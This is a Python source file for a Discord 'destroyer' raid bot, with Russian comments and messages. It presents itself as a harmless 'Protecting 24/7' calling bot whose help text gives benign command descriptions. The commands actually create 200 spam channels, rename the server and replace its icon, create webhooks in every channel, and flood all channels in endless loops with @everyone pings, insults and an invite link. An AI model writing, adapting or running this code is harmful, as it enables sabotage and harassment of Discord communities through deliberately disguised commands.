 import discord, os, sys, random, string, requests, configparser, json, asyncio, time
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init
from os import system, name

#Данного бота было лень писать, так как он ПОЛНОСТЬЮ СУКА состоит из сурса, моего друга Глютена
#Мне известно, что самсунг отсюда коды спиздил
#Поэтому, здесь я ничего не писал
#А вообще Глютен мне скзаал, скопировать сюда код весь глютен башера
# И написать дестроер краш бот
# Но скопировал не весь
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='t!', intents=intents, help_command=None)


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
    print(f"""{Fore.RED}
  ____ _    _   _ _____ _____ _   _ 
 / ___| |  | | | |_   _| ____| \ | |
| |  _| |  | | | | | | |  _| |  \| |
| |_| | |__| |_| | | | | |___| |\  |
 \____|_____\___/  |_| |_____|_| \_|
{Fore.RED} Здрасьте, это ГЛЮТЕН и
{Fore.RED} Полное адище начинается ;)""")








@client.command()
async def call(ctx):
    await ctx.send("Звонок начался, я хз не помню")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
    for b in range(200):
        try:
                await ctx.guild.create_text_channel("CRASH9D", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
        except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не cоздал канал")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")
    with open('bebra.png', 'rb') as f:
       icon = f.read()
    await ctx.guild.edit(name="CRASH9D", icon=icon)


@client.command()
async def hooks(ctx):
   await crhooks(ctx)
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))


async def crhooks(ctx):
  print(f"{Fore.WHITE}> {Fore.RED}Спамим хуками{Fore.WHITE}.")
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='ВЫ ЛОХИ')
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал хук в {channel}")
    except:
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал хук в {channel}")
      continue
  print(f"{Fore.WHITE}> {Fore.RED}Заспамили хуками{Fore.WHITE}.")


async def spamhook(ctx):
  while True:
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='@everyone @here Привет лохи, это я, ваш палач Destroyer, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/хуй', wait=True)
      except:
        continue


@client.command()
async def caller_id(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("@everyone @here Привет лохи, это я, ваш палач Destroyer, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/хуй")
      except:
        continue



@client.command()
async def settings(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("https://gfycat.com/flakyacrobatickusimanse")
      except:
        continue



#Help command.
#t!call - start a call
#t!caller_id - get your number
#t!settings - show bot settings
#t!balance - chech youe balance on guild
#t!subscribe - can offer a good subscription


@client.command()
async def help(ctx):
    await ctx.send("Help command.\n t!call - start a call \n t!caller_id - get your number \n t!settings - show bot settings \n t!balance - chech youe balance on guild \n t!subscribe - can offer a good subscription")





client.run("")
